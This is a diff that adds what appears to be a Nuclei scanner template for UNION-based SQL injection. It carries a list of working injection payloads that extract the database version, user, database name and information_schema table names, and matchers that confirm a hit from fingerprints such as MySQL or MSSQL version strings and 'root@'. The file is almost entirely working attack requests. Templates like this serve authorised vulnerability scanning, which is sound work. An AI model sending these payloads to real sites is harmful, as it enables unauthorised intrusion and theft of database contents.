@@ -1,0 +1,31 @@
+id: m7-sqli-union-based
+info:
+  name: M7 - UNION-Based SQL Injection
+  author: Sharlix
+  severity: critical
+  description: UNION-based SQLi for data extraction
+  tags: sqli,union,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=-1 UNION SELECT NULL,NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,version(),3--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,user(),3--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,database(),3--"
+      - "{{BaseURL}}?id=-1 UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,@@version,3--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,sys.fn_sqlvarbasetostr(HashBytes('MD5','1')),3--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "[0-9]+\.[0-9]+\.[0-9]+-[Mm]y[Ss][Qq][Ll]"
+          - "microsoft sql server"
+          - "PostgreSQL [0-9]"
+          - "[0-9]+\.[0-9]+\.[0-9]+\.MariaDB"
+          - "root@"
+          - "information_schema"
+        part: body
+        condition: or
